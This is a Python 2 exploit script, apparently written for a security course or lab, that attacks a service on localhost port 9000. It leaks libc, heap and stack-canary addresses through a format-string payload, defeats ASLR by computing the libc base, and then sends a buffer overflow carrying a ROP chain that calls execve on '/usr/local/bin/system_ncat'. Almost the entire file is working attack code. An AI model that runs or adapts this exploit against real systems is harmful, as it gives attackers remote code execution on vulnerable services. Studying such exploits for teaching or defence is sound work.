#!/usr/bin/env python2
import socket
import time
from struct import pack

# Code by Robin Larsson
# rl22ct@student.lnu.se
# robin.larsson@protonmail.ch
# 2019-11-11

# Tested and developed on the following versions.
#
# Ubuntu version:
# root@ubuntu:~# cat /etc/issue
# Ubuntu 18.04.3 LTS \n \l
#
# Kernel:
# root@ubuntu:~# uname -a
# Linux ubuntu 5.0.0-32-generic #34~18.04.2-Ubuntu SMP Thu Oct 10 10:36:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
#
# Libc version:
# root@ubuntu:~# ldd --version
# ldd (Ubuntu GLIBC 2.27-3ubuntu1) 2.27
#
# GCC version:
# root@ubuntu:~# gcc --version
# gcc (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0

host = '127.0.0.1'
port = 9000

# Convert 64-bit addresses to little endian.
p = lambda x : pack("<Q",x)				

# Length to ret is 128 + 8 + stack canary + 8.
A = "\x41"*128
B = "\42"*8

nop = "\x90"*80

# Register setup for execve syscall number 59.
# rax -> 59 -> 0x3b
# rdi -> /bin/sh
# rdx -> 0x0	0
# rsi -> 0x0	0

# Getting the ROP gadgets with Ropper.
# ./Ropper.py --file /lib/x86_64-linux-gnu/libc.so.6 --chain execve

# Address in memory to gadget: pop rax, ret
# rop += rebase_0(0x00000000000439c8) # 0x00000000000439c8: pop rax; ret;
pop_rax_ret_offset = int("00000000000439c8",16)
pop_rax_ret = "\xc8\x79\xa2\xf7\xff\x7f\x00\x00"

# Address in memory to gadget: pop rdi, ret
# rop += rebase_0(0x000000000002155f) # 0x000000000002155f: pop rdi; ret;
pop_rdi_ret = "\x5f\x55\xa0\xf7\xff\x7f\x00\x00"
pop_rdi_ret_offset = int("000000000002155f",16)

# Address in memory to gadget: pop rdx, ret
# rop += rebase_0(0x0000000000001b96) # 0x0000000000001b96: pop rdx; ret;
pop_rdx_ret = "\x96\x5b\x9e\xf7\xff\x7f\x00\x00"
pop_rdx_ret_offset = int("0000000000001b96",16)

# Address in memory to gadget: pop rsi, ret
# rop += rebase_0(0x0000000000023e6a) # 0x0000000000023e6a: pop rsi; ret;
pop_rsi_ret = "\x6a\x7e\xa0\xf7\xff\x7f\x00\x00"
pop_rsi_ret_offset = int("0000000000023e6a",16)

# Address in memory to gadget: syscall, ret
# rop += rebase_0(0x00000000000d2975) # 0x00000000000d2975: syscall; ret;
syscall = "\x75\x69\xab\xf7\xff\x7f\x00\x00"
syscall_offset = int("00000000000d2975",16)

#59 = 0x3b
fivenine = "\x3b\x00\x00\x00\x00\x00\x00\x00"

#0 = 0x0
zero = "\x00\x00\x00\x00\x00\x00\x00\x00"

# Building the payloads.
payload1 = "/usr/local/bin/system_ncat"

payload2 = '%lx,'* 58

# Delivering the payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

data = s.recv(1024);
#print data
print "Sending payload1..."
s.send(payload1)
time.sleep(1)

data = s.recv(1024);
#print data
print "Sending payload2..."
s.send(payload2)
time.sleep(1)

# Get the leaked addresses and split them.
data = s.recv(1024);
data = data.split(",")
#print data

system = int(data[9],16)
data_on_heap = int(data[35],16)
stack_canary = int(data[27],16)

print "Found system() in libc: " + str(hex(system))
print "Calculating libc start address..."

# Attach with gdb to a process with exact same libc version loaded as the target program:
# (gdb) info proc map
# Start Addr         End Addr         Size            Offset objfile
# 0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so

# Then calculate the length from system to libc start
# Hex value:
# 7ffff7a33440(location og system in libc leaked by the program) - 7ffff79e4000(location of libc start from gdb) = 4f440
# Decimal value:
# 140737348056128 - 140737347731456 = 324672

# This will most lily be different in the different libc versions. This needs to be in hex.
libc_length_from_start_to_system = int("4f440",16)

print "Length from libc start to system: " + str(hex(libc_length_from_start_to_system))

# Calculat PIE/ASLR enabled randomized libc start address.
libc_start = system - libc_length_from_start_to_system

print "Found libc start address: " + str(hex(libc_start))
print "Found address of payload1: " + str(hex(data_on_heap))
print "Found Stack Canary: " + str(hex(stack_canary))

#print data
print "Creating payload3..."

pop_rax_ret = libc_start + pop_rax_ret_offset
pop_rdi_ret = libc_start + pop_rdi_ret_offset
pop_rdx_ret = libc_start + pop_rdx_ret_offset
pop_rsi_ret = libc_start + pop_rsi_ret_offset
syscall = libc_start + syscall_offset

payload3 = A + "\x01\x00\x00\x00\x00\x00\x00\x00" + p(stack_canary) + B + p(pop_rax_ret) + fivenine + p(pop_rdi_ret) + p(data_on_heap) + p(pop_rdx_ret) + zero + p(pop_rsi_ret) + zero + p(syscall)

print "Sending payload3..."
s.send(payload3)

time.sleep(2)

s.close()
